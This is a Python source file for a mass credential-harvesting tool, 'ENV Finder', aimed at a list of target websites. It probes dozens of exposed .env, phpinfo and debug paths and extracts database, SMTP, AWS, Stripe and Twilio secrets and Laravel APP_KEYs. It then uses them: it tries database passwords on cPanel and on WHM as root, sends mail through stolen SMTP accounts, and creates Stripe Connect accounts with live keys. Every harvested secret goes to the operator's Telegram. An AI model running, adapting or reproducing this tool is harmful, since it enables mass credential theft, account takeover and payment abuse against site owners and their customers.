import requests
import os
import re
import urllib3
import smtplib
import stripe
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import Fore, Style, init
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
LIME = Fore.LIGHTGREEN_EX

# --- User Config ---
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
TEST_EMAIL_TO = 'youremail@gmail.com'  # Where to send test emails
FROM_NAME = 'SMTP Test by Bob Marley'
SMTP_PORTS = [25, 2525, 465, 587] # Do not Change!!!

banner = f"""{LIME}{Style.BRIGHT}
╔════════════════════════════════════════════════════════╗
║                                                        ║
║              ENV Finder By Bob Marley                  ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
print(banner)

print(f"{LIME}{Style.BRIGHT}How To Use:")
print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one per line.")
print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")

RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

def strip_quotes(value):
    if value is None:
        return value
    value = value.strip()
    if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
        return value[1:-1]
    return value

def send_telegram(message, parse_mode=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    if parse_mode:
        data["parse_mode"] = parse_mode
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")

def send_test_email(smtp_host, smtp_user, smtp_pass, mail_from, mail_to, url):
    smtp_user = strip_quotes(smtp_user)
    smtp_pass = strip_quotes(smtp_pass)
    mail_from = strip_quotes(mail_from)
    smtp_host = strip_quotes(smtp_host)
    from_name = FROM_NAME

    msg = MIMEText("SMTP Test Message from ENV Finder Script.")
    msg['Subject'] = 'SMTP Test'
    msg['From'] = f"{from_name} <{mail_from}>"
    msg['To'] = mail_to

    errors = []
    for port in SMTP_PORTS:
        try:
            if port == 465:
                server = smtplib.SMTP_SSL(smtp_host, port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_host, port, timeout=10)
                server.starttls()
            server.login(smtp_user, smtp_pass)
            server.sendmail(mail_from, [mail_to], msg.as_string())
            server.quit()
            print(f"{Fore.LIGHTGREEN_EX}[SMTP TEST SENT] to {mail_to} on port {port}{Style.RESET_ALL}")
            telegram_message = (
                f"✅ <b>SMTP Test Success</b>\n"
                f"<b>URL:</b> <code>{url}</code>\n"
                f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
                f"<b>MAILPORT:</b> <code>{port}</code>\n"
                f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
                f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
                f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
                f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
                f"<b>Test sent to:</b> <code>{mail_to}</code>"
            )
            send_telegram(telegram_message, parse_mode="HTML")
            return True
        except Exception as e:
            errors.append(f"Port {port}: {e}")

    # If all ports failed
    print(f"{Fore.LIGHTRED_EX}[SMTP TEST FAILED] on all ports: {SMTP_PORTS}{Style.RESET_ALL}")
    error_details = "\n".join(errors)
    telegram_message = (
        f"❌ <b>SMTP Test Failed on All Ports</b>\n"
        f"<b>URL:</b> <code>{url}</code>\n"
        f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
        f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
        f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
        f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
        f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
        f"<b>Test sent to:</b> <code>{mail_to}</code>\n"
        f"<b>Ports tried:</b> <code>{', '.join(str(p) for p in SMTP_PORTS)}</code>\n"
        f"<b>Errors:</b>\n<pre>{error_details}</pre>"
    )
    send_telegram(telegram_message, parse_mode="HTML")
    return False

def validate_and_check_stripe_key(stripe_secret, url):
    if not stripe_secret.startswith("sk_live_"):
        return

    # First, check if the key is valid by hitting the /v1/account endpoint
    try:
        headers = {"Authorization": f"Bearer {stripe_secret}"}
        resp = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=10)
        if resp.status_code != 200:
            print(f"{Fore.LIGHTRED_EX}[STRIPE INVALID KEY] {stripe_secret}{Style.RESET_ALL}")
            return
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[STRIPE ERROR] {stripe_secret} - {e}{Style.RESET_ALL}")
        return

    # Now, test Connect capability in multiple countries
    stripe.api_key = stripe_secret
    countries_to_test = [
    'US', 'GB', 'CA', 'AU', 'DE', 'FR', 'JP', 'IN', 'SG', 'NL', 'ES', 'IT', 'BR', 'SE', 'CH', 'IE', 'HK', 'MX', 'NZ', 'BE', 'AT', 'DK', 'FI', 'NO', 'PT', 'PL', 'CZ', 'RO', 'HU', 'GR', 'BG', 'HR', 'CY', 'EE', 'LV', 'LT', 'LU', 'LI', 'MY', 'MT', 'SK', 'SI'
]
    connect_success = False
    for country in countries_to_test:
        try:
            test_account = stripe.Account.create(
                type='express',
                country=country,
                email='test@example.com'
            )
            stripe.Account.delete(test_account.id)  # Clean up
            connect_success = True
            message = (
                f"✅ <b>Stripe key Live & Connect successful</b>\n"
                f"<b>URL:</b> <code>{url}</code>\n"
                f"<b>KEY:</b> <code>{stripe_secret}</code>\n"
                f"<b>Country:</b> <code>{country}</code>"
            )
            send_telegram(message, parse_mode="HTML")
            with open(f"{RESULTS_DIR}/stripe_valid.txt", "a") as f:
                f.write(f"{url} | {stripe_secret} | {country}\n")
            print(f"{Fore.LIGHTGREEN_EX}[STRIPE CONNECT SUCCESS] {stripe_secret} ({country}){Style.RESET_ALL}")
            break  # Stop after first success
        except Exception as e:
            print(f"{Fore.LIGHTYELLOW_EX}[STRIPE CONNECT FAILED] {stripe_secret} ({country}): {e}{Style.RESET_ALL}")

    if not connect_success:
        message = (
            f"❌ <b>Stripe key Live but Connect Failed</b>\n"
            f"<b>URL:</b> <code>{url}</code>\n"
            f"<b>KEY:</b> <code>{stripe_secret}</code>\n"
            f"<b>Countries tried:</b> <code>{', '.join(countries_to_test)}</code>"
        )
        send_telegram(message, parse_mode="HTML")

path = [
    "/.env",
    "/.env.bak",
    "/.env.backup",
    "/.env.save",
    "/.env.old",
    "/.env~",
    "/.env.txt",
    "/.env.prod",
    "/.env.production",
    "/.env.dev",
    "/.env.development",
    "/.env.local",
    "/.env.test",
    "/.env.testing",
    "/.env.stage",
    "/.env.staging",
    "/.env1",
    "/.env2",
    "/.env_copy",
    "/.env_copy.txt",
    "/.env.back",
    "/.env.bkp",
    "/.env_orig",
    "/.env.original",
    "/.env.save",
    "/.env.save.1",
    "/.env.save.2",
    "/.env.save.old",
    "/.env.save.bak",
    "/.env.save.bkp",
    "/.env.save.txt",
    "/.env.save~",
    "/.env.save.old",
    "/.env.save.backup",
    "/.env.save.example",
    "/.env.save.prod",
    "/.env.save.production",
    "/.env.save.dev",
    "/.env.save.development",
    "/.env.save.local",
    "/.env.save.test",
    "/.env.save.testing",
    "/.env.save.stage",
    "/.env.save.staging",
    "/vendor/.env",
    "/lib/.env",
    "/lab/.env",
    "/cronlab/.env",
    "/cron/.env",
    "/core/.env",
    "/core/app/.env",
    "/core/Database/.env",
    "/database/.env",
    "/config/.env",
    "/assets/.env",
    "/app/.env",
    "/apps/.env",
    "/uploads/.env",
    "/sitemaps/.env",
    "/site/.env",
    "/admin/.env",
    "/web/.env",
    "/public/.env",
    "/en/.env",
    "/tools/.env",
    "/v1/.env",
    "/administrator/.env",
    "/laravel/.env",
    "/api/.env",
    "/backend/.env",
    "/backend/web/.env",
    "/backend/app/.env",
    "/backend/config/.env",
    "/backend/database/.env",
    "/backend/core/.env",
    "/backend/admin/.env",
    "/backend/public/.env",
    "/backend/assets/.env",
    "/backend/uploads/.env",
    "/backend/site/.env",
    "/backend/tools/.env",
    "/backend/vendor/.env",
    "/backend/lib/.env",
    "/backend/lab/.env",
    "/backend/cronlab/.env",
    "/backend/cron/.env",
    "/backend/core/app/.env",
    "/backend/core/Database/.env",
    "/backend/sitemaps/.env",
    "/backend/en/.env",
    "/backend/v1/.env",
    "/backend/administrator/.env",
    "/backend/laravel/.env"
]

def load_or_create_list(filename, default_list):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            items = f.read().splitlines()
    except Exception:
        with open(filename, 'w', encoding='utf-8') as f:
            for item in default_list:
                f.write(item + '\n')
        items = default_list
    return items

apachepath = load_or_create_list('apachepath.txt', [
    "/_profiler/phpinfo",
    "/tool/view/phpinfo.view.php",
    "/wp-config.php-backup",
    "/%c0",
    "/debug/default/view.html",
    "/debug/default/view",
    "/frontend/web/debug/default/view",
    "/symfony/public/_profiler/phpinfo",
    "/debug/default/view?panel=config",
    "/phpinfo.php",
    "/phpinfo",
    "/aws.yml",
    "/.env.bak",
    "/info.php",
    "/.aws/credentials",
    "/config/aws.yml",
    "/config.js",
    "/symfony/public/_profiler/phpinfo",
    "/debug/default/view?panel=config",
    "symfony/public",
    "/debug/default/view?panel=config",
    "/frontend_dev.php"
])

debugpath = load_or_create_list('debugpath.txt', [
    '/',
    '/debug/default/view?panel=config',
    '/tool/view/phpinfo.view.php',
    '/wp-config.php-backup',
    '/%c0',
    '/debug/default/view.html',
    '/debug/default/view',
    '/frontend/web/debug/default/view',
    '/web/debug/default/view',
    '/sapi/debug/default/view',
    '/debug/default/view?panel=config'
])

phpmyadmin_paths = [
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
]
adminer_paths = [
    "/adminer/", "/adminer.php", "/adm.php"
]

found_urls = set()
found_phpmyadmin = set()
found_adminer = set()
db_creds_dict = {}

findings = {
    "ENV": 0,
    "PMA": 0,
    "ADM": 0,
    "SES": 0,
    "DB": 0,
    "SMTP": 0,
    "STRIPE": 0,
    "TWILIO": 0,
    "AWS": 0,
    "CPANEL": 0,
    "WHM": 0
}

def print_findings():
    print(
        f"{Fore.LIGHTMAGENTA_EX}"
        f"ENV : {findings['ENV']}  "
        f"PMA : {findings['PMA']}  "
        f"ADM : {findings['ADM']}  "
        f"SES : {findings['SES']}  "
        f"DB : {findings['DB']}  "
        f"SMTP : {findings['SMTP']}  "
        f"STRIPE : {findings['STRIPE']}  "
        f"TWILIO : {findings['TWILIO']}  "
        f"AWS : {findings['AWS']}  "
        f"CPANEL : {findings['CPANEL']}  "
        f"WHM : {findings['WHM']}"
        f"{Style.RESET_ALL}"
    )

def safe_find(pattern, text):
    m = re.search(pattern, text, re.MULTILINE)
    return strip_quotes(m.group(1).strip()) if m else ''

def is_env_file(text):
    env_keys = ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"]
    found = sum(1 for key in env_keys if key in text)
    if found >= 3 and not re.search(r'<html|<!DOCTYPE', text, re.IGNORECASE):
        return True
    return False

def grab_aws(url, text):
    aws_id = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
    aws_bucket = safe_find(r'^AWS_BUCKET\s*=\s*(.*)', text)

    # Only save if both keys look real
    if (
        aws_id and aws_secret and
        re.match(r'^(AKIA|ASIA)[A-Z0-9]{16}$', aws_id) and
        len(aws_secret) >= 40 and not aws_secret.startswith('AWS_DEFAULT_REGION')
    ):
        build = (
            f"URL: {url}\n"
            f"AWS_ACCESS_KEY_ID: {aws_id}\n"
            f"AWS_SECRET_ACCESS_KEY: {aws_secret}\n"
            f"AWS_DEFAULT_REGION: {aws_region}\n"
            f"AWS_BUCKET: {aws_bucket}\n"
        )
        with open(f'{RESULTS_DIR}/aws.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["AWS"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED AWS] aws.txt{Style.RESET_ALL}")
        return True
    return False

def grab_ses_smtp(url, text):
    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
        if mailuser and mailpass:
            build = (
                f"URL: {url}\n"
                f"MAILHOST: {mailhost}\n"
                f"MAILPORT: {mailport}\n"
                f"MAILUSER: {mailuser}\n"
                f"MAILPASS: {mailpass}\n"
                f"MAILFROM: {mailfrom}\n"
                f"FROMNAME: {fromname}\n"
            )
            with open(f'{RESULTS_DIR}/SMTP_SES.txt', 'a', encoding='utf-8') as f:
                f.write(build + '\n')
                f.flush()
            findings["SES"] += 1
            findings["SMTP"] += 1
            print(f"{Fore.LIGHTGREEN_EX}[SAVED SES SMTP] SMTP_SES.txt{Style.RESET_ALL}")
            if TEST_EMAIL_TO:
                send_test_email(mailhost, mailuser, mailpass, mailfrom or mailuser, TEST_EMAIL_TO, url)
            return True
    return False

def grab_smtp(url, text):
    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
        return False  # SES SMTP handled by grab_ses_smtp
    if 'MAIL_HOST' in text:
        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
        if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
            return False
        build = (
            f"URL: {url}\n"
            f"MAILHOST: {mailhost}\n"
            f"MAILPORT: {mailport}\n"
            f"MAILUSER: {mailuser}\n"
            f"MAILPASS: {mailpass}\n"
            f"MAILFROM: {mailfrom}\n"
            f"FROMNAME: {fromname}\n"
        )
        filename = 'SMTP_RANDOM.txt'
        with open(f'{RESULTS_DIR}/{filename}', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["SMTP"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED SMTP] {filename}{Style.RESET_ALL}")
        if TEST_EMAIL_TO:
            send_test_email(mailhost, mailuser, mailpass, mailfrom or mailuser, TEST_EMAIL_TO, url)
        return True
    return False

def grab_twilio(url, text):
    sid = safe_find(r'^TWILIO_ACCOUNT_SID\s*=\s*(.*)', text)
    token = safe_find(r'^TWILIO_AUTH_TOKEN\s*=\s*(.*)', text)
    phone = safe_find(r'^TWILIO_PHONE_NUMBER\s*=\s*(.*)', text)
    if sid and token and phone:
        build = (
            f"TWILIO_ACCOUNT_SID={sid}\n"
            f"TWILIO_AUTH_TOKEN={token}\n"
            f"TWILIO_PHONE_NUMBER={phone}\n"
        )
        with open(f'{RESULTS_DIR}/twilio.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["TWILIO"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED TWILIO] twilio.txt{Style.RESET_ALL}")
        return True
    return False

def grab_stripe(url, text):
    stripe_key = safe_find(r'^STRIPE_KEY\s*=\s*(.*)', text)
    stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
    if stripe_secret and stripe_secret.startswith("sk_live_"):
        build = f'URL: {url}\nSTRIPE_SECRET: {stripe_secret}'
        with open(f'{RESULTS_DIR}/stripe.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
            f.flush()
        findings["STRIPE"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED STRIPE] stripe.txt{Style.RESET_ALL}")
        send_telegram(f"<b>Stripe Secret Found</b>\n<pre>{build}</pre>", parse_mode="HTML")
        validate_and_check_stripe_key(stripe_secret, url)
        return True
    return False

def try_cpanel_whm(host, db_user, db_pass):
    host = host.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    db_user = strip_quotes(db_user)
    db_pass = strip_quotes(db_pass)
    # Try cPanel
    try:
        url = f"https://{host}:2083/login"
        data = {"user": db_user, "pass": db_pass}
        resp = requests.post(url, data=data, verify=False, allow_redirects=False, timeout=10)
        if "URL=/cpses" in resp.text:
            entry = f"{url}|{db_user}|{db_pass}\n"
            with open(f"{RESULTS_DIR}/cpanel.txt", "a", encoding="utf-8") as f:
                if entry not in try_cpanel_whm.cpanel_whm_logins:
                    f.write(entry)
                    try_cpanel_whm.cpanel_whm_logins.add(entry)
            findings["CPANEL"] += 1
            print(f"{Fore.LIGHTGREEN_EX}[CPANEL VALID] {url}|{db_user}|{db_pass}{Style.RESET_ALL}")
            send_telegram(f"<b>cPanel Login Found</b>\n<code>{url}|{db_user}|{db_pass}</code>", parse_mode="HTML")
    except Exception:
        pass
    # Try WHM
    try:
        url = f"https://{host}:2087/login"
        data = {"user": "root", "pass": db_pass}
        resp = requests.post(url, data=data, verify=False, allow_redirects=False, timeout=10)
        if "URL=/cpses" in resp.text:
            entry = f"{url}|root|{db_pass}\n"
            with open(f"{RESULTS_DIR}/whm.txt", "a", encoding="utf-8") as f:
                if entry not in try_cpanel_whm.cpanel_whm_logins:
                    f.write(entry)
                    try_cpanel_whm.cpanel_whm_logins.add(entry)
            findings["WHM"] += 1
            print(f"{Fore.LIGHTGREEN_EX}[WHM VALID] {url}|root|{db_pass}{Style.RESET_ALL}")
            send_telegram(f"<b>WHM Login Found</b>\n<code>{url}|root|{db_pass}</code>", parse_mode="HTML")
    except Exception:
        pass
try_cpanel_whm.cpanel_whm_logins = set()

def grab_db(site_base, url, text):
    db_conn = safe_find(r'^DB_CONNECTION\s*=\s*(.*)', text)
    db_host = safe_find(r'^DB_HOST\s*=\s*(.*)', text)
    db_port = safe_find(r'^DB_PORT\s*=\s*(.*)', text)
    db_name = safe_find(r'^DB_DATABASE\s*=\s*(.*)', text)
    db_user = safe_find(r'^DB_USERNAME\s*=\s*(.*)', text)
    db_pass = safe_find(r'^DB_PASSWORD\s*=\s*(.*)', text)
    creds_tuple = (db_conn, db_host, db_port, db_name, db_user, db_pass)
    if all(creds_tuple) and db_user and db_pass and db_user.lower() != "null" and db_pass.lower() != "null":
        db_creds_dict[site_base] = creds_tuple
        build = (
            f'URL: {url}\n'
            f'DB_CONNECTION: {db_conn}\n'
            f'DB_HOST: {db_host}\n'
            f'DB_PORT: {db_port}\n'
            f'DB_DATABASE: {db_name}\n'
            f'DB_USERNAME: {db_user}\n'
            f'DB_PASSWORD: {db_pass}'
        )
        with open(f'{RESULTS_DIR}/Database.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
            f.flush()
        findings["DB"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED DB] Database.txt{Style.RESET_ALL}")
        try_cpanel_whm(site_base, db_user, db_pass)
        return creds_tuple
    return None

def format_phpmyadmin(url, creds):
    if creds:
        db_user = creds[4]
        db_pass = creds[5]
        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
    else:
        return ""

def format_adminer(url, creds):
    if creds:
        db_user = creds[4]
        db_pass = creds[5]
        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
    else:
        return ""

def check_phpmyadmin(site_base):
    creds = db_creds_dict.get(site_base, None)
    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
        return
    for phpmyadmin_path in phpmyadmin_paths:
        url = site_base.rstrip('/') + phpmyadmin_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and "phpMyAdmin" in resp.text:
                if url not in found_phpmyadmin:
                    found_phpmyadmin.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND PMA] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/phpmyadmin.txt', 'a', encoding='utf-8') as f:
                        f.write(format_phpmyadmin(url, creds))
                        f.flush()
                    findings["PMA"] += 1
                    print_findings()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR PMA] {url} ({e}){Style.RESET_ALL}")

def check_adminer(site_base):
    creds = db_creds_dict.get(site_base, None)
    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
        return
    for adminer_path in adminer_paths:
        url = site_base.rstrip('/') + adminer_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and ("Adminer" in resp.text or "adminer" in resp.text):
                if url not in found_adminer:
                    found_adminer.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND ADM] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/adminer.txt', 'a', encoding='utf-8') as f:
                        f.write(format_adminer(url,creds))
                        f.flush()
                    findings["ADM"] += 1
                    print_findings()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR ADM] {url} ({e}){Style.RESET_ALL}")

def is_site_alive(site):
    try:
        resp = requests.get(site, timeout=10)
        return resp.status_code < 400
    except:
        return False

def get_site_base(site):
    if site.endswith('/'):
        site = site[:-1]
    return site

def save_base64_appkey(url, text):
    m = re.search(r'^APP_KEY\s*=\s*(base64:[^\s]+)', text, re.MULTILINE)
    if m:
        appkey = m.group(1).strip()
        base_url = re.match(r'(https?://[^/]+)', url)
        if base_url:
            base_url = base_url.group(1)
        else:
            base_url = url
        with open(f'{RESULTS_DIR}/RCE.txt', 'a', encoding='utf-8') as f:
            f.write(f"{base_url}|{appkey}\n")
            f.flush()
        print(f"{Fore.LIGHTGREEN_EX}[RCE APP_KEY] {base_url}|{appkey}{Style.RESET_ALL}")
        return True
    return False

def extract_sensitive_config(text):
    keys = [
        'APP_KEY', 'DB_CONNECTION', 'DB_HOST', 'DB_PORT', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
        'MAIL_MAILER', 'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD', 'MAIL_ENCRYPTION',
        'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME',
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION', 'AWS_BUCKET',
        'STRIPE_KEY', 'STRIPE_SECRET',
        'TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_PHONE_NUMBER'
    ]
    found_lines = []
    for line in text.splitlines():
        for k in keys:
            if line.strip().startswith(k):
                found_lines.append(line)
                break
    return '\n'.join(found_lines)

def has_interesting_keys(sensitive):
    interesting = [
        "DB_", "MAIL_", "AWS_", "STRIPE_", "TWILIO_", "APP_KEY"
    ]
    return any(k in sensitive for k in interesting)

saved_apache_blocks = set()
saved_debug_blocks = set()

def save_block(filename, url, sensitive, saved_blocks):
    block = f"========================\nURL: {url}\n------------------------\n{sensitive}\n========================\n\n"
    if block not in saved_blocks:
        with open(f"{RESULTS_DIR}/{filename}", 'a', encoding='utf-8') as f:
            f.write(block)
        saved_blocks.add(block)

def exploit(target):
    if '://' not in target:
        site = 'http://' + target
    else:
        site = target
    site_base = get_site_base(site)

    if not is_site_alive(site_base):
        print(f"{Fore.LIGHTRED_EX}[DEAD SITE] {site_base} (skipping all .env checks){Style.RESET_ALL}")
        return

    # Laravel .env paths
    for read_path in path:
        exploit_path = site_base.rstrip('/') + read_path
        try:
            resp = requests.get(exploit_path, timeout=10)
            if resp.status_code == 200 and is_env_file(resp.text):
                if exploit_path not in found_urls:
                    found_urls.add(exploit_path)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/env.txt', 'a', encoding='utf-8') as f:
                        f.write(exploit_path + '\n')
                        f.flush()
                    findings["ENV"] += 1

                    save_base64_appkey(exploit_path, resp.text)
                    grab_aws(exploit_path, resp.text)

                    ses_found = grab_ses_smtp(exploit_path, resp.text)
                    if not ses_found:
                        grab_smtp(exploit_path, resp.text)
                    grab_twilio(exploit_path, resp.text)
                    grab_stripe(exploit_path, resp.text)
                    grab_db(site_base, exploit_path, resp.text)

                    print_findings()
                break
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[FAILED] {exploit_path} (status {resp.status_code}){Style.RESET_ALL}")
        except Exception as error:
            print(f"{Fore.LIGHTRED_EX}[BAD WEBSITE] {exploit_path} ({error}){Style.RESET_ALL}")

    # Apache paths
    for apath in apachepath:
        url = site_base.rstrip('/') + apath
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                sensitive = extract_sensitive_config(resp.text)
                if sensitive and has_interesting_keys(sensitive):
                    save_block("apache.txt", url, sensitive, saved_apache_blocks)
                    grab_aws(url, resp.text)
        except Exception:
            pass

    # Debug paths
    for dpath in debugpath:
        url = site_base.rstrip('/') + dpath
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                sensitive = extract_sensitive_config(resp.text)
                if sensitive and has_interesting_keys(sensitive):
                    save_block("debug.txt", url, sensitive, saved_debug_blocks)
                    grab_aws(url, resp.text)
        except Exception:
            pass

    check_phpmyadmin(site_base)
    check_adminer(site_base)

def main():
    global TEST_EMAIL_TO
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    targets_file = input(f"{LIME}{Style.BRIGHT}Enter the filename containing target domains: {Style.RESET_ALL}").strip()
    if not os.path.isfile(targets_file):
        print(f"{Fore.LIGHTRED_EX}File not found: {targets_file}{Style.RESET_ALL}")
        return

    with open(targets_file, 'r', encoding='utf-8') as f:
        targets = [line.strip() for line in f if line.strip()]

    pool = ThreadPool(10)
    start = timer()
    pool.map(exploit, targets)
    pool.close()
    pool.join()
    end = timer()
    print(f"\n{Fore.LIGHTCYAN_EX}Scan completed in {end - start:.2f} seconds.{Style.RESET_ALL}")
    print_findings()

if __name__ == "__main__":
    main()
